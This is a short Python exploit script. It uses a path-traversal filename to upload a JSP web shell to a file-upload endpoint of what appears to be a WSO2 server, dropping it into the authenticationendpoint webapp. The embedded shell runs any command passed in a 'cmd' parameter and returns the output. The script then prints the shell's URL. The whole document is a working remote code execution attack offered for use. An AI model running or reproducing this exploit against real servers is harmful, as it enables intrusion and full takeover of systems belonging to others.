import requests, urllib3, sys

if len(sys.argv) != 3:
    print(f"Usage: python3 {sys.argv[0]} https://host shell.jsp")
    exit()

host, file = sys.argv[1:]
shell = """<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
        <pre><%=output %></pre>"""

files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{file}": shell}
response = requests.post(f'{host}/fileupload/toolsAny', files=files, verify=False)
print(f"shell @ {host}/authenticationendpoint/{file}")